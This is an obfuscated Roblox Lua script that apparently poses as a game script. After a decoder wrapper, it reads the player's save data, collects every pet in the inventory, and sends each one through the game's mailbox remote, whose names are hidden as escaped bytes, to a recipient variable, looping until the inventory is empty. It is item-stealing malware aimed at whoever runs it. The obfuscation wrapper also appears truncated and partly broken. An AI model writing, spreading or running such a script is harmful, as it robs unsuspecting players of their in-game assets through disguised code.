local v0=tonumber;local v1=string.byte;local v2=string.char;local v3=string.sub;local v4=string.gsub;local v5=string.rep;local v6=table.concat;local v7=table.insert;local v8=math.ldexp;local v9=getfenv or function() return _ENV; end;local v10=setmetatable;local v11=pcall;local v12=select;local v13=unpack or table.unpack;local v14=tonumber;local function v15(A0,A1,...)local A2=1;local A3;A0=v4(v3(A0,5),"..",function(G0)if(v1(G0,2)==81)then A3=v0(v3(G0,1,1));return"";else local G1=v0(v3(G0,1,2));if A3 then return v5(v2(G1),A3);else return v2(G1);end end end);local function A4()local A5=v1(A0,A2,A2);A2=A2+1;return A5;end;local function A6()local A7,A8=v1(A0,A2,A2+1);A2=A2+2;return(A8*256)+A7;end;local function A9()local AA=A6();local AB=A6();local AC=(AB%32);local AD=(AB-(AB%32))/32;local AE=1;if(AD==0)then if(AA==0)then return 0;else AE=1;end elseif(AD==1)then return((AA==0)and(AE*(1/0)))or(AE*0/0);end return v8(AE,AD-1)*((AC*65536)+AA);end;local function B0(B1)if not B1 then B1=A6();if(B1==0)then return"";end end;local B2=v3(A0,A2,A2+B1-1);A2=A2+B1;return B2;end;local function B3(...)return{...},v12("#",...);end;local function B4()local B5={};local B6={};local B7={};B5[1]=function()return A6();end;B5[2]=function()return B0();end;B5[3]=function()return A4();end;B5[4]=function()return A9();end;B5[5]=function()return nil;end;local function B8(B9)local BA=B9[1];local BB=B9[2];local BC=v3(BA,1,1)=="\0"and v3(BA,2)or BA;local BD=B5[BB]or B5[5];return BD(),BC;end;return B8;end;local BE=B4();local BF=function()end;local BG={};local BH={};while true do
  local BI, BJ=BE({B0(A6()),A6()});if(#BI==0)then break;end;BH[BJ]=BI;v11(BF);
end;return function(...) 
  local BK=BH["main"];local BL=BH["gP"];local BM=BH["env"];local BN=BH["gt"];local BO=BH["loop"];if not BK then return;end;
  local ReplicatedStorage=game:GetService(v3("ReplicatedStorage",1));local saveData=require(ReplicatedStorage.Library.Client["Save"]).Get();
  local function getPets(C0)
      local C1={}
      for C2,C3 in pairs(C0.Inventory.Pet)do
          local C4=C3._am or 1;local C5=C3.id;
          local C6=ReplicatedStorage:FindFirstChild("\95\95DIRECTORY") and ReplicatedStorage.__DIRECTORY:FindFirstChild("Pets");
          if C6 then
              local C7=C6:FindFirstChild(C5)
              if C7 then
                  local C8=pcall(require,C7)
                  if C8 then
                      v7(C1,{name=C5,amount=C4,key=C2})
                  end
              end
          end
      end
      return C1
  end
  while true do
      local pets=getPets(saveData)
      if #pets==0 then
          break
      end
      if #pets>0 then
          local pet=pets[1]
          local args={[1]=name,[2]=message,[3]="Pet",[4]=pet.key,[5]=1}
          ReplicatedStorage:WaitForChild("\78\101\116\119\111\114\107"):WaitForChild("\77\97\105\108\98\111\120\58\32\83\101\110\100"):InvokeServer(v13(args))
          wait(1.5)
      end
  end
end;
end;v15("LOL!Q115Q00025Q00053Q0.."),v9() 
